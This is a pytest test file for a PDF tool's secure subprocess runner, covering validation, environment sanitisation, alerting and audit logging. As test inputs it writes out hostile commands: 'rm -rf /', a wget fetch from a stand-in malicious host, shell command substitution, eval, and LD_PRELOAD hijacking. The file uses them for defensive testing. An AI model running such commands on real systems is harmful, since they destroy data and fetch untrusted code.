#!/usr/bin/env python3
"""
Tests for enhanced security features in subprocess utilities.
"""

import tempfile
from pathlib import Path

import pytest

from pdfrebuilder.security.subprocess_utils import (
    SecureSubprocessRunner,
    SecurityError,
    SecurityMonitor,
    check_security_alerts,
    get_security_monitor,
    get_security_report,
)


class TestEnhancedSecurity:
    """Test enhanced security features."""

    def test_resource_monitoring(self):
        """Test resource monitoring functionality."""
        from tests.security_test_config import create_safe_runner

        runner = create_safe_runner()

        # Run a simple command
        result = runner.run(["python", "--version"])
        assert result.returncode == 0

        # Check that monitoring data is collected
        report = runner.get_security_report()
        assert "total_commands" in report
        assert report["total_commands"] > 0

    def test_security_violation_monitoring(self):
        """Test security violation monitoring."""
        runner = SecureSubprocessRunner()

        # Try to run a dangerous command
        with pytest.raises(SecurityError):
            runner.run(["rm", "-rf", "/"])

        # Check that violation was recorded
        report = runner.get_security_report()
        assert "security_violations" in report
        assert len(report["security_violations"]) > 0

    def test_enhanced_command_validation(self):
        """Test enhanced command validation."""
        runner = SecureSubprocessRunner()

        # Test dangerous characters
        with pytest.raises(SecurityError):
            runner.run(["python", "-c", "import os; os.system('ls')"])

        # Test dangerous patterns
        with pytest.raises(SecurityError):
            runner.run(["bash", "-c", "$(echo hello)"])

    def test_environment_sanitization(self):
        """Test environment variable sanitization."""
        runner = SecureSubprocessRunner()

        # Test with dangerous environment variables
        dangerous_env = {
            "PATH": "/malicious/path",
            "LD_PRELOAD": "/malicious/lib.so",
            "SAFE_VAR": "safe_value",
        }

        # Should run without the dangerous env vars
        result = runner.run(["python", "--version"], env=dangerous_env)
        assert result.returncode == 0

    def test_security_alerting(self):
        """Test security alerting system."""
        # Create monitor with low thresholds for testing
        monitor = SecurityMonitor(
            alert_thresholds={
                "max_violations_per_hour": 1,
                "max_blocked_commands_per_hour": 1,
                "suspicious_pattern_threshold": 1,
            }
        )

        # Simulate security violations
        monitor.monitor_security_violation("test_violation", {"test": "data"})

        # Check for alerts
        alerts = monitor.check_alerts()
        assert len(alerts) > 0
        assert any(alert["alert_type"] == "HIGH_VIOLATION_RATE" for alert in alerts)

    def test_audit_logging(self):
        """Test audit logging functionality."""
        with tempfile.TemporaryDirectory() as temp_dir:
            audit_file = Path(temp_dir) / "audit.log"
            runner = SecureSubprocessRunner(audit_log_file=audit_file)

            # Run a command
            result = runner.run(["python", "--version"])
            assert result.returncode == 0

            # Check that audit log was created and contains data
            assert audit_file.exists()
            audit_content = audit_file.read_text()
            assert "COMMAND_EXECUTION" in audit_content

    def test_suspicious_pattern_detection(self):
        """Test suspicious pattern detection."""
        monitor = SecurityMonitor()

        # Simulate commands with suspicious patterns
        suspicious_commands = [
            ["bash", "-c", "rm -rf /tmp"],
            ["sh", "-c", "wget http://malicious.com/script.sh"],
            ["python", "-c", "eval('malicious code')"],
        ]

        for cmd in suspicious_commands:
            monitor.monitor_command_execution(cmd, "testuser", False, 1.0)

        report = monitor.get_security_report()
        assert len(report["suspicious_patterns"]) > 0

    def test_global_security_monitor(self):
        """Test global security monitor functionality."""
        # Get global monitor
        monitor1 = get_security_monitor()
        monitor2 = get_security_monitor()

        # Should be the same instance
        assert monitor1 is monitor2

        # Test global functions
        report = get_security_report()
        assert isinstance(report, dict)

        alerts = check_security_alerts()
        assert isinstance(alerts, list)

    def test_security_metrics_reset(self):
        """Test security metrics reset functionality."""
        runner = SecureSubprocessRunner()

        # Run some commands
        runner.run(["python", "--version"])
        runner.run(["python", "--help"])

        # Check metrics
        report = runner.get_security_report()
        assert report["total_commands"] >= 2

        # Reset metrics
        runner.reset_monitoring()

        # Check that metrics were reset
        report = runner.get_security_report()
        assert report["total_commands"] == 0

    def test_monitoring_start_stop(self):
        """Test monitoring start/stop functionality."""
        runner = SecureSubprocessRunner()

        # Stop monitoring
        runner.stop_monitoring()

        # Run command (should not be monitored)
        runner.run(["python", "--version"])

        # Start monitoring
        runner.start_monitoring()

        # Run command (should be monitored)
        runner.run(["python", "--help"])

        report = runner.get_security_report()
        # Should only have the second command
        assert report["total_commands"] == 1


if __name__ == "__main__":
    pytest.main([__file__])
